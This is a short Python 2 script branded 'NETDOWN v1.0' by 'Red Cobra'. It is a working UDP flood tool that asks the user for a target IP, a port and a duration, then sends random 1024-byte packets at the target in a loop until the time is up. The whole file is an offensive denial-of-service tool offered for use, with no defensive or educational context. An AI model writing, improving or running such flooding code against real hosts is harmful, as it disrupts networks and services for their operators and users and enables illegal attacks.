import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system("clear")
print('''

      ___ ___  __   __            
|\ | |__   |  |  \ /  \ |  | |\ | 
| \| |___  |  |__/ \__/ |/\| | \|  v1.0

      Developed by Red Cobra

''')
print ""
ip = raw_input('Target IP: ')
port = input('Port: ')
duration = input('Time: ')
timeout = time.time() + duration
sent = 0

while True:
	if time.time() > timeout:
		break
	else:
		pass
	sock.sendto(bytes,(ip, port))
	sent = sent + 1
	print "Sent %s packets to %s through port %s"%(sent, ip, port)
